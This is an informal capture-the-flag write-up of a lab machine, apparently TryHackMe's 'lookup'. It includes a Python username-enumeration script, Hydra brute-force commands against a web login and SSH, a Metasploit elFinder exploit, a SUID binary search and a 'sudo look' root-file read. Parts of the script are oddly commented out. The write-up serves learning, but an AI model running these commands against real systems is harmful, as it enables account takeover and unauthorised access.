# lookup
the first thing is doing an nmap scan, and found that there are some ports that are open

   
But if we look closely at the websiteâ€™s behavior, we can observe that it is possible to enumerate valid usernames based on the error we are getting from the website upon a failed login:

Trying admin:admin


Trying fig:admin


We can write a small python script that would help us enumerate valid usernames:

#import requests
#import multiprocessing

#target = 'http://lookup.thm/login.php'
#username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

#def user_check(name):
    data = {"username": name, "password": "password"}
    try:
        response = requests.post(target, data=data, timeout=5)
        if "Wrong password" in response.text:
            print(f"User found: {name}")
    except requests.RequestException as e:
        print(f"[!] Error checking {name}: {e}")

if __name__ == "__main__":
    try:
        with open(username_file, 'r') as user_file:
            users = [line.strip() for line in user_file if line.strip()]

        # Use a pool with 30 worker processes
        with multiprocessing.Pool(processes=30) as pool:
            pool.map(user_check, users)

    except FileNotFoundError:
        print(f'Error: File path {username_file} does not exist.')



Using this scripts found  some users:

   

Now lets try a brute force for user jose using hydra:
 hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V

[80][http-post-form] host: lookup.thm   login: jose   password:

found one valid password for jose
Lets try login with user jose using the password that we found and we:
landed in something called “elFinder”. This looks like a file manager.

There are quite a few files here, and they all contain what seems to be passwords. Still, before we try another brute-force, let’s see if we can identify the version of elfinder:
Searching for known exploits for elfinder, we can see a metasploit module that targets versions before 2.1.48 :
We shall use metasploit
search elfinder 
then use 4
Lets see the available users : we see there is user root and think
There is a .passwords file here, which might be interesting, but we don’t have the permission to read it.

Let’s search for SUID binaries:

find / -perm /4000 2>/dev/null

![image](https://github.com/user-attachments/assets/6bec9d14-9965-47b6-9013-36054366e0d2)
Bingo, we tricked the binary into extracting “think” as the username, and we got back what seems to be a password list!
Let’s save that list to a file on our kali and try brute-forcing “think”

hydra -l think -P usr_think.txt ssh://lookup.thm

login using ssh
ssh think@lookup.thm   

to access root we use sudo look '' /root/root.txt



